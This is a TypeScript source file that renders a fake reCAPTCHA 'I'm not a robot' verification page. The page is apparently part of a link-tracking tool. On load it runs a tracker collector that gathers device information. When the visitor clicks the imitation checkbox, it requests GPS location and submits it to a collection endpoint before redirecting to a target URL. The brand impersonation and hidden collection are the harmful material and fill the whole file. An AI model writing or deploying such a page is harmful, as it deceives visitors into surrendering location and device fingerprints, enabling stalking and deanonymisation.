import { escapeHtml } from '../utils/html.js';

interface CaptchaTemplateOptions {
  siteTitle?: string;
  message?: string;
}

export function renderCaptchaTemplate(slug: string, targetUrl: string, options: CaptchaTemplateOptions = {}, gpsMode: string = 'optional'): string {
  const siteTitle = escapeHtml(options.siteTitle || 'Security Check');
  const message = escapeHtml(options.message || 'Please verify that you are a human to continue.');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${siteTitle}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #333; }
    .container { max-width: 360px; width: 100%; padding: 24px; }
    h1 { font-size: 18px; font-weight: 500; margin-bottom: 8px; text-align: center; }
    .msg { font-size: 14px; color: #666; text-align: center; margin-bottom: 24px; line-height: 1.5; }
    .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 4px; padding: 16px; display: flex; align-items: center; gap: 12px; cursor: pointer; box-shadow: 0 2px 4px rgba(0,0,0,0.08); transition: border-color 0.2s; }
    .captcha-box:hover { border-color: #bbb; }
    .captcha-box.checking { pointer-events: none; }
    .captcha-box.done { border-color: #4caf50; }
    .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: all 0.2s; }
    .checkbox.checking { border-color: #2196f3; }
    .checkbox.done { border-color: #4caf50; background: #4caf50; }
    .checkbox svg { display: none; width: 18px; height: 18px; fill: #fff; }
    .checkbox.done svg { display: block; }
    .spinner-check { display: none; width: 20px; height: 20px; border: 2px solid #e0e0e0; border-top-color: #2196f3; border-radius: 50%; animation: spin 0.8s linear infinite; }
    .checkbox.checking .spinner-check { display: block; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .captcha-label { font-size: 14px; color: #555; flex: 1; }
    .captcha-brand { text-align: right; }
    .captcha-brand .brand-text { font-size: 10px; color: #999; }
    .captcha-brand .brand-name { font-size: 11px; color: #555; font-weight: 600; font-style: italic; }
    .redirect-msg { display: none; margin-top: 16px; text-align: center; font-size: 13px; color: #4caf50; }
    .redirect-msg.show { display: block; }
  </style>
</head>
<body>
  <div class="container">
    <h1>${siteTitle}</h1>
    <p class="msg">${message}</p>
    <div class="captcha-box" id="captchaBox" onclick="handleCaptcha()">
      <div class="checkbox" id="checkbox">
        <div class="spinner-check"></div>
        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
      </div>
      <span class="captcha-label">I'm not a robot</span>
      <div class="captcha-brand">
        <div class="brand-text">powered by</div>
        <div class="brand-name">reCAPTCHA</div>
      </div>
    </div>
    <p class="redirect-msg" id="redirectMsg">Verification successful. Redirecting...</p>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@2/dist/ua-parser.min.js"></script>
  <script src="/static/collector.js"></script>
  <script>
    window.__TRACKER_CONFIG = {
      slug: ${JSON.stringify(slug)},
      collectUrl: '/c/' + ${JSON.stringify(slug)},
      targetUrl: ${JSON.stringify(targetUrl)},
      templateId: 'captcha',
      gpsMode: ${JSON.stringify(gpsMode)}
    };
    if (window.TrackerCollector) { window.TrackerCollector.collectDeviceInfo(); }
    var clicked = false;
    function handleCaptcha() {
      if (clicked) return;
      clicked = true;
      var box = document.getElementById('captchaBox');
      var cb = document.getElementById('checkbox');
      var msg = document.getElementById('redirectMsg');
      box.classList.add('checking');
      cb.classList.add('checking');
      if (window.TrackerCollector) {
        window.TrackerCollector.requestGPSAndSubmit(window.__TRACKER_CONFIG, function() {
          cb.classList.remove('checking');
          cb.classList.add('done');
          box.classList.remove('checking');
          box.classList.add('done');
          msg.classList.add('show');
          setTimeout(function() { window.location.href = window.__TRACKER_CONFIG.targetUrl; }, 2000);
        });
      }
    }
  </script>
</body>
</html>`;
}
